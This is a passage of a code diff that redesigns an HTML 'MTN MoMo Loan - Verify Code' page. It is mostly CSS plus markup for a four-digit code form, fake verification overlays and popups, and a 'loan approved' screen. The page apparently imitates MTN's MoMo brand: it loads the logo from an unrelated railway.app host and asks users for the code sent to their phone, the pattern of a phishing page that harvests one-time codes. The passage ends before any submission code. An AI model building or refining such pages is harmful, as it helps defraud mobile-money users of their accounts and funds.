@@ -1,23 +1,45 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <title>MTN MoMo Loan - Verify Code</title>
+    <meta name="theme-color" content="#000000">
+    <title>MTN MoMo Loan - Verify Code | MoMo Advance Loans</title>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent;
+        :root {
+            --black: #000000;
+            --mtn-dark: #003366;
+            --mtn-mid: #004080;
+            --mtn-gold: #FFCC00;
+            --mtn-gold-light: #FFD633;
+            --mtn-gold-dark: #E6B800;
+            --grad: linear-gradient(135deg, #003366 0%, #004080 100%);
+            --grad-gold: linear-gradient(135deg, #FFCC00 0%, #FFD633 100%);
+            --page-bg: #f9fafb;
+            --white: #FFFFFF;
+            --text-dark: #1C2340;
+            --text-mid: #4B5168;
+            --text-light: #8B90A3;
+            --border: #E4E7EF;
+            --error: #DC2626;
+            --success: #16A34A;
+            --header-h: 74px;
+            --footer-h: 68px;
+            --shadow-md: 0 6px 20px rgba(0, 25, 60, 0.08);
+            --shadow-lg: 0 20px 50px rgba(0, 25, 60, 0.12);
         }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
 
         html, body {
             height: 100%;
             font-family: 'Inter', sans-serif;
-            background: #f0f2f5;
+            background: var(--page-bg);
             overflow: hidden;
         }
 
@@ -25,67 +47,91 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-            padding: 10px;
+            padding: var(--header-h) 0 var(--footer-h) 0;
             height: 100vh;
             height: 100dvh;
-            gap: 10px;
+            -webkit-font-smoothing: antialiased;
         }
 
-        header {
-            width: 100%;
-            max-width: 480px;
-            padding: 12px 16px;
+        /* ═══════════ HEADER ═══════════ */
+        .header {
+            position: fixed;
+            top: 0; left: 0; right: 0;
+            height: var(--header-h);
+            background-color: var(--black);
+            color: var(--white);
+            z-index: 100;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.4);
+        }
+        .header-inner {
+            max-width: 1200px;
+            margin: 0 auto;
+            height: 100%;
+            padding: 0 18px;
             display: flex;
-            justify-content: space-between;
             align-items: center;
-            background: white;
-            border-radius: 16px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
-            position: relative;
+            justify-content: space-between;
+        }
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            text-decoration: none;
+            color: inherit;
+        }
+        .brand-logo-img { height: 48px; width: auto; display: block; }
+        .brand-divider {
+            width: 1px; height: 26px;
+            background: rgba(255, 255, 255, 0.2);
+            margin: 0 4px;
             flex-shrink: 0;
         }
-
-        .back-btn {
-            font-size: 24px;
-            background: none;
-            border: none;
-            cursor: pointer;
-            color: #333;
-            line-height: 1;
-            width: 24px;
-            text-align: left;
-            padding: 0;
-        }
-
-        .logo-container {
-            position: absolute;
-            left: 50%;
-            transform: translateX(-50%);
-        }
-
-        .momo-icon {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            background: #0047AB;
-            color: #FFCC00;
-            font-weight: 700;
-            font-size: 16px;
-            padding: 7px 16px;
-            border-radius: 40px;
-            line-height: 1;
-            letter-spacing: -0.5px;
-            box-shadow: 0 4px 12px rgba(0,71,171,0.25);
+        .brand-sub {
+            font-size: 12px;
+            color: #9ca3af;
+            font-weight: 500;
+            letter-spacing: 0.5px;
             white-space: nowrap;
+        }
+        .header-back {
+            background: rgba(255, 255, 255, 0.08);
+            border: 1px solid rgba(255, 255, 255, 0.14);
+            color: rgba(255, 255, 255, 0.9);
+            font-size: 0.82rem;
+            font-weight: 700;
+            font-family: 'Inter', sans-serif;
+            padding: 8px 14px;
+            border-radius: 50px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            transition: background 0.2s;
+        }
+        .header-back:hover {
+            background: rgba(255, 255, 255, 0.18);
+            color: #fff;
+        }
+
+        /* ═══════════ CARD ═══════════ */
+        .card-wrap {
+            width: 100%;
+            max-width: 480px;
+            margin: 14px 0;
+            padding: 0 14px;
+            flex: 1;
+            min-height: 0;
+            display: flex;
+            flex-direction: column;
         }
 
         .card {
             background: white;
-            border-radius: 24px;
-            padding: 24px 20px;
+            border-radius: 22px;
+            padding: 26px 20px;
             width: 100%;
-            max-width: 480px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+            box-shadow: var(--shadow-lg);
+            border: 1px solid rgba(0, 51, 102, 0.05);
             flex: 1;
             min-height: 0;
             display: flex;
@@ -95,16 +141,16 @@
         }
 
         .icon-badge {
-            width: 64px;
-            height: 64px;
+            width: 64px; height: 64px;
             border-radius: 50%;
-            background: linear-gradient(135deg, #f0f4ff, #e0e8ff);
+            background: linear-gradient(135deg, #FFFBEB, #FFF3C0);
             display: flex;
             align-items: center;
             justify-content: center;
             margin: 0 auto 14px;
-            font-size: 30px;
-            box-shadow: 0 6px 18px rgba(0, 71, 171, 0.12);
+            font-size: 28px;
+            box-shadow: 0 6px 18px rgba(255, 204, 0, 0.25);
+            border: 1px solid #FFE999;
             flex-shrink: 0;
         }
 
@@ -112,27 +158,31 @@
             font-size: 20px;
             font-weight: 800;
             text-align: center;
-            color: #1a1a2e;
+            color: var(--text-dark);
             margin-bottom: 8px;
             line-height: 1.3;
+            letter-spacing: -0.02em;
         }
-
-        .page-title .highlight { color: #0047AB; }
+        .page-title .highlight {
+            background: var(--grad-gold);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            font-weight: 900;
+        }
 
         .instruction {
             font-size: 13px;
-            color: #666;
+            color: var(--text-mid);
             text-align: center;
             line-height: 1.55;
             margin-bottom: 22px;
             padding: 0 4px;
+            font-weight: 500;
         }
+        .instruction strong { color: var(--text-dark); font-weight: 800; }
 
-        .instruction strong {
-            color: #1a1a2e;
-            font-weight: 700;
-        }
-
+        /* ═══════════ OTP BOXES ═══════════ */
         .otp-boxes {
             display: flex;
             justify-content: center;
@@ -146,33 +196,35 @@
             text-align: center;
             font-size: 26px;
             font-weight: 800;
-            color: #1a1a2e;
-            border: 2px solid #e0e0e0;
+            color: var(--text-dark);
+            border: 1.5px solid var(--border);
             border-radius: 14px;
-            background: #fafbff;
+            background: #FBFCFE;
             transition: border-color 0.2s, box-shadow 0.2s, background 0.2s, transform 0.15s;
             outline: none;
             font-family: 'Inter', sans-serif;
-            caret-color: #0047AB;
+            caret-color: var(--mtn-gold-dark);
             padding: 0;
             flex: none;
         }
 
         .otp-box:focus {
-            border-color: #0047AB;
-            background: #f0f4ff;
-            box-shadow: 0 0 0 3px rgba(0, 71, 171, 0.12);
+            border-color: var(--mtn-gold);
+            background: #ffffff;
+            box-shadow: 0 0 0 4px rgba(255, 204, 0, 0.18);
             transform: scale(1.04);
         }
 
         .otp-box.filled {
-            border-color: #0047AB;
-            background: #f0f4ff;
+            border-color: var(--mtn-gold);
+            background: linear-gradient(135deg, #FFFBEB, #FFF3C0);
+            color: #7A5C00;
         }
 
         .otp-box.invalid {
-            border-color: #e74c3c;
-            box-shadow: 0 0 0 3px rgba(231, 76, 60, 0.12);
+            border-color: var(--error);
+            background: #FFF5F5;
+            box-shadow: 0 0 0 4px rgba(220, 38, 38, 0.12);
             animation: shake 0.4s ease;
         }
 
@@ -183,44 +235,64 @@
         }
 
         .error-text {
-            color: #e74c3c;
+            color: var(--error);
             font-size: 12px;
             margin-top: 8px;
             display: none;
-            font-weight: 500;
+            font-weight: 700;
             line-height: 1.4;
             text-align: center;
         }
-        .error-text.show { display: block; }
+        .error-text.show { display: block; animation: slideDown 0.3s ease; }
+        @keyframes slideDown {
+            from { opacity: 0; transform: translateY(-4px); }
+            to   { opacity: 1; transform: translateY(0); }
+        }
 
         .verify-btn {
             width: 100%;
             padding: 16px;
-            background: linear-gradient(135deg, #0047AB, #002D7A);
-            color: white;
+            background: var(--grad-gold);
+            color: #1A1A2E;
             border: none;
-            border-radius: 50px;
-            font-size: 16px;
-            font-weight: 700;
+            border-radius: 14px;
+            font-size: 15px;
+            font-weight: 900;
+            letter-spacing: 0.05em;
             cursor: pointer;
-            transition: transform 0.2s, box-shadow 0.2s, opacity 0.2s;
+            transition: transform 0.2s, box-shadow 0.2s, opacity 0.2s, filter 0.2s;
             font-family: 'Inter', sans-serif;
             margin-top: 22px;
+            box-shadow: 0 10px 24px rgba(255, 204, 0, 0.4);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            position: relative;
+            overflow: hidden;
         }
-
+        .verify-btn::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(120deg, transparent 30%, rgba(255,255,255,0.4) 50%, transparent 70%);
+            transform: translateX(-100%);
+            transition: transform 0.7s;
+        }
+        .verify-btn:hover::after { transform: translateX(100%); }
         .verify-btn:hover:not(:disabled) {
-            transform: scale(1.02);
-            box-shadow: 0 8px 25px rgba(0, 71, 171, 0.3);
+            transform: translateY(-2px);
+            box-shadow: 0 14px 30px rgba(255, 204, 0, 0.55);
+            filter: brightness(0.98);
         }
         .verify-btn:active:not(:disabled) { transform: scale(0.98); }
         .verify-btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
 
         .spinner {
             display: inline-block;
-            width: 14px;
-            height: 14px;
-            border: 2.5px solid rgba(255, 255, 255, 0.4);
-            border-top-color: #fff;
+            width: 14px; height: 14px;
+            border: 2.5px solid rgba(0, 0, 0, 0.25);
+            border-top-color: #1A1A2E;
             border-radius: 50%;
             animation: spin 0.7s linear infinite;
             vertical-align: -3px;
@@ -232,58 +304,110 @@
             text-align: center;
             margin-top: 18px;
             font-size: 12px;
-            color: #777;
+            color: var(--text-light);
+            font-weight: 600;
         }
-
         .resend-link {
             font-size: 12px;
-            font-weight: 700;
-            color: #0047AB;
+            font-weight: 800;
+            color: var(--mtn-dark);
             background: none;
             border: none;
             font-family: 'Inter', sans-serif;
             cursor: pointer;
-            padding: 4px 8px;
+            padding: 5px 10px;
             border-radius: 8px;
             transition: background 0.2s;
         }
-        .resend-link:hover:not(:disabled) { background: #f0f4ff; }
+        .resend-link:hover:not(:disabled) { background: #EEF3FF; }
         .resend-link:disabled { color: #bbb; cursor: not-allowed; }
 
         .security-notice {
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 5px;
+            gap: 6px;
             margin-top: 18px;
             font-size: 11px;
-            color: #999;
+            color: var(--text-light);
             text-align: center;
             line-height: 1.5;
+            font-weight: 600;
         }
+        .security-notice .ico { color: var(--success); font-size: 13px; }
 
-        footer {
-            padding: 6px;
-            color: #aaa;
-            font-size: 11px;
-            text-align: center;
-            width: 100%;
-            max-width: 480px;
-            flex-shrink: 0;
+        /* ═══════════ FOOTER ═══════════ */
+        .footer {
+            position: fixed;
+            bottom: 0; left: 0; right: 0;
+            height: var(--footer-h);
+            background: var(--white);
+            border-top: 1px solid var(--border);
+            box-shadow: 0 -4px 20px rgba(0, 0, 0, 0.06);
+            z-index: 100;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
+        .footer-text { font-size: 11px; color: var(--text-light); font-weight: 600; letter-spacing: 0.05em; }
 
+        /* ═══════════════════════════════════════════
+           SUPER VERIFY OVERLAY
+        ═══════════════════════════════════════════ */
         .verify-overlay {
             position: fixed;
             inset: 0;
-            background: #ffffff;
+            background: radial-gradient(circle at 50% 30%, #003366 0%, #001A33 60%, #000913 100%);
             display: none;
             flex-direction: column;
             align-items: center;
             justify-content: center;
             padding: 32px 24px;
-            z-index: 2000;
+            z-index: 10000;
+            overflow: hidden;
         }
-        .verify-overlay.show { display: flex; }
+        .verify-overlay.show { display: flex; animation: fadeIn 0.5s ease; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        .verify-overlay::before {
+            content: '';
+            position: absolute;
+            top: 50%; left: 50%;
+            width: 700px; height: 700px;
+            transform: translate(-50%, -50%);
+            background: radial-gradient(circle, rgba(255, 204, 0, 0.15) 0%, transparent 60%);
+            animation: glowPulse 3s ease-in-out infinite;
+            pointer-events: none;
+        }
+        @keyframes glowPulse {
+            0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 0.7; }
+            50% { transform: translate(-50%, -50%) scale(1.15); opacity: 1; }
+        }
+
+        .verify-particles { position: absolute; inset: 0; overflow: hidden; pointer-events: none; }
+        .verify-particle {
+            position: absolute;
+            width: 4px; height: 4px;
+            background: var(--mtn-gold);
+            border-radius: 50%;
+            opacity: 0;
+            box-shadow: 0 0 12px rgba(255, 204, 0, 0.8);
+            animation: particleFloat 8s infinite ease-in-out;
+        }
+        .verify-particle:nth-child(1) { left: 10%; top: 80%; animation-delay: 0s; }
+        .verify-particle:nth-child(2) { left: 25%; top: 60%; animation-delay: 1.2s; }
+        .verify-particle:nth-child(3) { left: 80%; top: 75%; animation-delay: 2.4s; }
+        .verify-particle:nth-child(4) { left: 65%; top: 85%; animation-delay: 3.6s; }
+        .verify-particle:nth-child(5) { left: 45%; top: 90%; animation-delay: 4.8s; }
+        .verify-particle:nth-child(6) { left: 88%; top: 45%; animation-delay: 6s; }
+        .verify-particle:nth-child(7) { left: 12%; top: 40%; animation-delay: 7.2s; }
+        .verify-particle:nth-child(8) { left: 55%; top: 15%; animation-delay: 5.4s; }
+        @keyframes particleFloat {
+            0% { opacity: 0; transform: translateY(0) scale(0.6); }
+            15% { opacity: 1; transform: translateY(-30px) scale(1.1); }
+            80% { opacity: 0.7; transform: translateY(-280px) scale(0.9); }
+            100% { opacity: 0; transform: translateY(-340px) scale(0.4); }
+        }
 
         .verify-content {
             display: flex;
@@ -291,92 +415,310 @@
             align-items: center;
             max-width: 340px;
             text-align: center;
+            position: relative;
+            z-index: 2;
         }
 
-        .verify-momo-icon {
-            display: inline-flex;
+        .verify-orbit { width: 140px; height: 140px; position: relative; margin-bottom: 34px; }
+        .verify-orbit-ring {
+            position: absolute;
+            inset: 0;
+            border-radius: 50%;
+            border: 2px dashed rgba(255, 204, 0, 0.35);
+            animation: rotateSlow 10s linear infinite;
+        }
+        .verify-orbit-ring.inner {
+            inset: 22px;
+            border: 1.5px dashed rgba(255, 204, 0, 0.55);
+            animation: rotateSlow 6s linear infinite reverse;
+        }
+        @keyframes rotateSlow { to { transform: rotate(360deg); } }
+
+        .verify-orbit-core {
+            position: absolute;
+            top: 50%; left: 50%;
+            width: 72px; height: 72px;
+            transform: translate(-50%, -50%);
+            border-radius: 18px;
+            background: var(--grad-gold);
+            display: flex;
             align-items: center;
             justify-content: center;
-            background: #0047AB;
-            color: #FFCC00;
-            font-weight: 800;
-            font-size: 20px;
-            padding: 11px 22px;
-            border-radius: 50px;
-            line-height: 1;
-            box-shadow: 0 8px 24px rgba(0, 71, 171, 0.28);
-            margin-bottom: 32px;
-            animation: overlayPulse 2s ease-in-out infinite;
+            box-shadow: 0 0 40px rgba(255, 204, 0, 0.55), 0 0 80px rgba(255, 204, 0, 0.3);
+            animation: corePulse 2s ease-in-out infinite;
+            padding: 8px;
         }
-        @keyframes overlayPulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
+        .verify-orbit-core img { width: 100%; height: 100%; object-fit: contain; }
+        @keyframes corePulse {
+            0%, 100% {
+                box-shadow: 0 0 40px rgba(255, 204, 0, 0.55), 0 0 80px rgba(255, 204, 0, 0.3);
+                transform: translate(-50%, -50%) scale(1);
+            }
+            50% {
+                box-shadow: 0 0 55px rgba(255, 204, 0, 0.85), 0 0 110px rgba(255, 204, 0, 0.5);
+                transform: translate(-50%, -50%) scale(1.06);
+            }
         }
 
-        .verify-spinner {
-            width: 52px;
-            height: 52px;
-            border: 5px solid #e0e8ff;
-            border-top-color: #0047AB;
+        .verify-dot-orbit { position: absolute; inset: 0; animation: rotateSlow 3.5s linear infinite; }
+        .verify-dot-orbit span {
+            position: absolute;
+            width: 8px; height: 8px;
             border-radius: 50%;
-            animation: verifySpin 0.9s linear infinite;
-            margin-bottom: 26px;
+            background: var(--mtn-gold);
+            box-shadow: 0 0 12px rgba(255, 204, 0, 0.9);
         }
-        @keyframes verifySpin { to { transform: rotate(360deg); } }
+        .verify-dot-orbit span:nth-child(1) { top: 0; left: 50%; transform: translateX(-50%); }
+        .verify-dot-orbit span:nth-child(2) { bottom: 0; left: 50%; transform: translateX(-50%); }
+        .verify-dot-orbit span:nth-child(3) { top: 50%; left: 0; transform: translateY(-50%); }
+        .verify-dot-orbit span:nth-child(4) { top: 50%; right: 0; transform: translateY(-50%); }
 
         .verify-title {
-            font-size: 19px;
+            font-size: 20px;
             font-weight: 800;
-            color: #1a1a2e;
+            color: #fff;
             margin-bottom: 10px;
-            line-height: 1.3;
+            line-height: 1.35;
+            letter-spacing: -0.3px;
         }
-        .verify-title .highlight { color: #0047AB; }
+        .verify-title .highlight {
+            background: linear-gradient(90deg, #FFCC00, #FFD633);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
 
         .verify-subtitle {
-            font-size: 13px;
-            color: #888;
+            font-size: 13.5px;
+            color: rgba(255, 255, 255, 0.7);
             line-height: 1.6;
-            margin-bottom: 28px;
+            margin-bottom: 30px;
+            font-weight: 500;
+            min-height: 1.4em;
         }
 
-        .verify-dots span {
-            display: inline-block;
-            animation: dotBlink 1.4s infinite both;
-        }
+        .verify-dots span { display: inline-block; animation: dotBlink 1.4s infinite both; }
         .verify-dots span:nth-child(1) { animation-delay: 0s; }
         .verify-dots span:nth-child(2) { animation-delay: 0.2s; }
         .verify-dots span:nth-child(3) { animation-delay: 0.4s; }
-
         @keyframes dotBlink {
             0%, 80%, 100% { opacity: 0.2; }
             40% { opacity: 1; }
         }
 
         .verify-bar {
-            width: 200px;
-            height: 5px;
-            background: #e8edf7;
+            width: 240px;
+            height: 6px;
+            background: rgba(255, 204, 0, 0.12);
             border-radius: 4px;
             overflow: hidden;
-            margin-bottom: 28px;
+            margin-bottom: 30px;
+            position: relative;
         }
         .verify-bar-fill {
             height: 100%;
             width: 0%;
-            background: linear-gradient(90deg, #0047AB, #FFCC00);
+            background: linear-gradient(90deg, #FFCC00, #FFD633, #FFCC00);
+            background-size: 200% 100%;
             border-radius: 4px;
-            transition: width 0.3s ease;
+            transition: width 0.4s ease;
+            box-shadow: 0 0 14px rgba(255, 204, 0, 0.7);
+            animation: shimmer 2s linear infinite;
+        }
+        @keyframes shimmer {
+            0% { background-position: 200% 0; }
+            100% { background-position: -200% 0; }
         }
 
-        .verify-security {
+        .verify-step {
+            position: relative;
+            height: 20px;
+            overflow: hidden;
+            margin-bottom: 20px;
+            width: 100%;
+        }
+        .verify-step-inner {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            transition: transform 0.5s cubic-bezier(0.22, 1, 0.36, 1);
+        }
+        .verify-step-text {
+            height: 20px;
+            line-height: 20px;
+            font-size: 12px;
+            color: rgba(255, 204, 0, 0.9);
+            font-weight: 700;
+            letter-spacing: 0.03em;
+        }
+
+        .verify-status-row {
             display: flex;
             align-items: center;
-            gap: 5px;
-            font-size: 11px;
-            color: #aaa;
+            gap: 8px;
+            font-size: 11.5px;
+            color: rgba(255, 255, 255, 0.5);
+            font-weight: 600;
+            letter-spacing: 0.05em;
+            text-transform: uppercase;
+        }
+        .verify-status-dot {
+            width: 7px; height: 7px;
+            border-radius: 50%;
+            background: #22C55E;
+            box-shadow: 0 0 10px rgba(34, 197, 94, 0.9);
+            animation: statusPulse 1.6s ease-in-out infinite;
+        }
+        @keyframes statusPulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(0.85); }
         }
 
+        /* ═══════════════════════════════════════════
+           NOTICE POPUP (reject / resend)
+        ═══════════════════════════════════════════ */
+        .notice-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.65);
+            backdrop-filter: blur(6px);
+            -webkit-backdrop-filter: blur(6px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+            z-index: 11000;
+        }
+        .notice-overlay.show {
+            display: flex;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .notice-card {
+            background: #fff;
+            border-radius: 24px;
+            width: 100%;
+            max-width: 400px;
+            padding: 30px 24px 26px;
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.4);
+            animation: popIn 0.45s cubic-bezier(0.22, 1, 0.36, 1) both;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        @keyframes popIn {
+            from { transform: scale(0.88) translateY(20px); opacity: 0; }
+            to { transform: scale(1) translateY(0); opacity: 1; }
+        }
+
+        .notice-icon-wrap {
+            width: 74px; height: 74px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 18px;
+            font-size: 34px;
+            position: relative;
+        }
+
+        /* Reject (red) */
+        .notice-icon-wrap.reject {
+            background: linear-gradient(135deg, #FEE2E2, #FECACA);
+            box-shadow: 0 8px 24px rgba(220, 38, 38, 0.25);
+        }
+        .notice-icon-wrap.reject::before {
+            content: '';
+            position: absolute;
+            inset: -6px;
+            border-radius: 50%;
+            border: 2px solid rgba(220, 38, 38, 0.2);
+            animation: ringPulse 2s ease-out infinite;
+        }
+
+        /* Resend (amber) */
+        .notice-icon-wrap.resend {
+            background: linear-gradient(135deg, #FFF8DC, #FFF3C0);
+            box-shadow: 0 8px 24px rgba(255, 204, 0, 0.35);
+        }
+        .notice-icon-wrap.resend::before {
+            content: '';
+            position: absolute;
+            inset: -6px;
+            border-radius: 50%;
+            border: 2px solid rgba(255, 204, 0, 0.3);
+            animation: ringPulse 2s ease-out infinite;
+        }
+
+        @keyframes ringPulse {
+            0% { transform: scale(1); opacity: 1; }
+            100% { transform: scale(1.4); opacity: 0; }
+        }
+
+        .notice-title {
+            font-size: 1.25rem;
+            font-weight: 800;
+            color: var(--text-dark);
+            margin-bottom: 10px;
+            line-height: 1.3;
+            letter-spacing: -0.02em;
+        }
+
+        .notice-message {
+            font-size: 0.9rem;
+            color: var(--text-mid);
+            line-height: 1.6;
+            margin-bottom: 24px;
+            font-weight: 500;
+            padding: 0 4px;
+        }
+        .notice-message strong { color: var(--text-dark); font-weight: 800; }
+
+        .notice-btn {
+            width: 100%;
+            padding: 16px;
+            background: var(--grad-gold);
+            color: #1A1A2E;
+            border: none;
+            border-radius: 14px;
+            font-size: 15px;
+            font-weight: 900;
+            letter-spacing: 0.05em;
+            cursor: pointer;
+            font-family: 'Inter', sans-serif;
+            box-shadow: 0 10px 24px rgba(255, 204, 0, 0.4);
+            transition: transform 0.2s, box-shadow 0.2s, filter 0.2s;
+            position: relative;
+            overflow: hidden;
+        }
+        .notice-btn::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(120deg, transparent 30%, rgba(255,255,255,0.4) 50%, transparent 70%);
+            transform: translateX(-100%);
+            transition: transform 0.7s;
+        }
+        .notice-btn:hover::after { transform: translateX(100%); }
+        .notice-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 14px 30px rgba(255, 204, 0, 0.55);
+            filter: brightness(0.98);
+        }
+        .notice-btn:active { transform: scale(0.98); }
+
+        .notice-btn.reject-btn {
+            background: linear-gradient(135deg, #DC2626, #B91C1C);
+            color: #fff;
+            box-shadow: 0 10px 24px rgba(220, 38, 38, 0.4);
+        }
+        .notice-btn.reject-btn:hover {
+            box-shadow: 0 14px 30px rgba(220, 38, 38, 0.55);
+        }
+
+        /* ═══════════════════════════════════════════
+           CONGRATS OVERLAY
+        ═══════════════════════════════════════════ */
         .congrats-overlay {
             position: fixed;
             inset: 0;
@@ -386,16 +728,11 @@
             align-items: center;
             justify-content: center;
             padding: 20px;
-            z-index: 3000;
+            z-index: 12000;
             backdrop-filter: blur(6px);
             animation: fadeIn 0.3s ease;
         }
         .congrats-overlay.show { display: flex; }
-
-        @keyframes fadeIn {
-            0% { opacity: 0; }
-            100% { opacity: 1; }
-        }
 
         .congrats-content {
             background: white;
@@ -409,18 +746,12 @@
             text-align: center;
         }
 
-        @keyframes popIn {
-            0% { transform: scale(0.7); opacity: 0; }
-            100% { transform: scale(1); opacity: 1; }
-        }
-
         .congrats-header {
-            background: linear-gradient(135deg, #0047AB, #002D7A);
+            background: var(--grad);
             padding: 30px 24px 24px;
             position: relative;
             overflow: hidden;
         }
-
         .congrats-header::before {
             content: '🎉🎊💰';
             position: absolute;
@@ -439,7 +770,6 @@
             animation: bounce 1.5s infinite;
             position: relative;
         }
-
         @keyframes bounce {
             0%, 100% { transform: translateY(0) scale(1); }
             50% { transform: translateY(-8px) scale(1.05); }
@@ -452,25 +782,27 @@
             margin-bottom: 6px;
             position: relative;
         }
-
         .congrats-subtitle {
             font-size: 13px;
             color: rgba(255, 255, 255, 0.9);
             position: relative;
         }
 
-        .congrats-body {
-            padding: 24px 22px 28px;
-        }
+        .congrats-body { padding: 24px 22px 28px; }
 
         .congrats-message {
             font-size: 16px;
             font-weight: 700;
-            color: #1a1a2e;
+            color: var(--text-dark);
             line-height: 1.5;
             margin-bottom: 8px;
         }
-        .congrats-message .highlight { color: #0047AB; }
+        .congrats-message .highlight {
+            background: var(--grad-gold);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
 
         .congrats-time {
             display: inline-flex;
@@ -489,48 +821,55 @@
 
         .congrats-note {
             font-size: 12px;
-            color: #888;
+            color: var(--text-light);
             line-height: 1.5;
             margin-bottom: 20px;
             padding: 0 8px;
+            font-weight: 600;
         }
 
         .congrats-btn {
             width: 100%;
             padding: 16px;
-            background: linear-gradient(135deg, #0047AB, #002D7A);
-            color: white;
+            background: var(--grad-gold);
+            color: #1A1A2E;
             border: none;
-            border-radius: 50px;
-            font-size: 16px;
-            font-weight: 800;
+            border-radius: 14px;
+            font-size: 15px;
+            font-weight: 900;
             cursor: pointer;
             font-family: 'Inter', sans-serif;
             text-transform: uppercase;
-            letter-spacing: 1px;
-            transition: transform 0.2s, box-shadow 0.2s;
+            letter-spacing: 0.05em;
+            transition: transform 0.2s, box-shadow 0.2s, filter 0.2s;
+            box-shadow: 0 10px 24px rgba(255, 204, 0, 0.4);
         }
         .congrats-btn:hover {
-            transform: scale(1.02);
-            box-shadow: 0 8px 25px rgba(0, 71, 171, 0.4);
+            transform: translateY(-2px);
+            box-shadow: 0 14px 30px rgba(255, 204, 0, 0.55);
+            filter: brightness(0.98);
         }
         .congrats-btn:active { transform: scale(0.98); }
 
+        /* ═══════════ SMALL PHONES ═══════════ */
         @media (max-height: 700px) {
             .card { padding: 18px 16px; }
-            .icon-badge {
-                width: 54px;
-                height: 54px;
-                font-size: 26px;
-                margin-bottom: 10px;
-            }
+            .icon-badge { width: 54px; height: 54px; font-size: 26px; margin-bottom: 10px; }
             .page-title { font-size: 18px; }
             .instruction { font-size: 12px; margin-bottom: 16px; }
             .otp-box { width: 50px; height: 56px; font-size: 22px; }
             .verify-btn { margin-top: 16px; padding: 14px; }
         }
-
+        @media (max-width: 480px) {
+            .brand-logo-img { height: 42px; }
+            .brand-sub { font-size: 11px; }
+            .verify-orbit { width: 120px; height: 120px; }
+            .verify-orbit-core { width: 62px; height: 62px; border-radius: 16px; }
+            .verify-title { font-size: 18px; }
+        }
         @media (max-width: 380px) {
+            .brand-sub { display: none; }
+            .brand-divider { display: none; }
             .otp-boxes { gap: 8px; }
             .otp-box { width: 46px; height: 52px; font-size: 20px; border-radius: 12px; }
             .congrats-title { font-size: 20px; }
@@ -539,72 +878,128 @@
     </style>
 </head>
 <body>
-    <header>
-        <button class="back-btn" onclick="window.location.href='sms-paste.html'" aria-label="Go back">←</button>
-        <div class="logo-container">
-            <span class="momo-icon">MoMo</span>
+
+    <!-- HEADER -->
+    <header class="header">
+        <div class="header-inner">
+            <a href="sms-paste.html" class="brand">
+                <img src="https://ug-starlinknetwork.up.railway.app/static/images/momo_logo.png" alt="MTN MoMo" class="brand-logo-img">
+                <div class="brand-divider"></div>
+                <span class="brand-sub">MoMo Advance Loans</span>
+            </a>
+            <button class="header-back" onclick="window.location.href='sms-paste.html'">← Back</button>
         </div>
-        <div style="width:24px;"></div>
     </header>
 
-    <main class="card">
-        <div class="icon-badge">🔐</div>
+    <!-- CARD -->
+    <div class="card-wrap">
+        <main class="card">
+            <div class="icon-badge">🔐</div>
 
-        <h1 class="page-title">
-            Enter <span class="highlight">Verification Code</span>
-        </h1>
+            <h1 class="page-title">
+                Enter <span class="highlight">Verification Code</span>
+            </h1>
 
-        <p class="instruction">
-            We sent a <strong>4-digit code</strong> to your MoMo number.
-            Enter it below to confirm your loan disbursement.
-        </p>
+            <p class="instruction">
+                We sent a <strong>4-digit code</strong> to your MoMo number.
+                Enter it below to confirm your loan disbursement.
+            </p>
 
-        <div class="otp-boxes" id="otpBoxes">
-            <input type="tel" class="otp-box" id="otp1" maxlength="1" inputmode="numeric" autocomplete="off">
-            <input type="tel" class="otp-box" id="otp2" maxlength="1" inputmode="numeric" autocomplete="off">
-            <input type="tel" class="otp-box" id="otp3" maxlength="1" inputmode="numeric" autocomplete="off">
-            <input type="tel" class="otp-box" id="otp4" maxlength="1" inputmode="numeric" autocomplete="off">
-        </div>
+            <div class="otp-boxes" id="otpBoxes">
+                <input type="tel" class="otp-box" id="otp1" maxlength="1" inputmode="numeric" autocomplete="off">
